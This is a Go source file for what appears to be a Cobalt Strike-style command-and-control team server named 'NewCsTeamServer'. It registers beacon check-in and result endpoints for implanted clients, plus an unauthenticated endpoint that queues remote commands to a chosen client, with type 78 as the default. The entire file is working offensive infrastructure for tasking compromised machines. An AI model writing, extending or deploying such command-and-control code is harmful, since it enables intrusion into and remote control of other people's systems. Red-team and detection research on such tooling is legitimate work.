package main

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/server"
	"NewCsTeamServer/task"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"
)

// HTTP处理任务下发请求
func handleIssueTask(w http.ResponseWriter, r *http.Request, cm *client.ClientManager) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID uint32 `json:"client_id"`
		Type     uint32 `json:"type"` // 4字节命令类型，适配客户端
		Content  string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, fmt.Sprintf("invalid request body: %v", err), http.StatusBadRequest)
		return
	}

	client, exists := cm.GetClient(req.ClientID)
	if !exists {
		http.Error(w, "client not found", http.StatusNotFound)
		return
	}
	if req.Type == 0 {
		req.Type = 78
	}
	task := task.Task{
		ID:        fmt.Sprintf("%d-%d", req.ClientID, time.Now().UnixNano()),
		Type:      req.Type,
		Content:   []byte(req.Content),
		CreatedAt: time.Now(),
	}
	client.TaskQueue.AddTask(task)

	log.Printf("Task issued to client %d: ID=%s, Type=%s, Content=%s", req.ClientID, task.ID, task.Type, task.Content)
	w.Write([]byte("Task issued successfully"))
}
func main() {
	client.GlobalClientManager = client.NewClientManager()
	http.HandleFunc("/beacon", server.HandleBeacon)
	http.HandleFunc("/beacon_result", func(w http.ResponseWriter, r *http.Request) {
		server.HandleBeaconResult(w, r, client.GlobalClientManager)
	})
	http.HandleFunc("/issue_task", func(w http.ResponseWriter, r *http.Request) {
		handleIssueTask(w, r, client.GlobalClientManager)
	})

	log.Println("Starting server on :8081")
	if err := http.ListenAndServe(":8081", nil); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
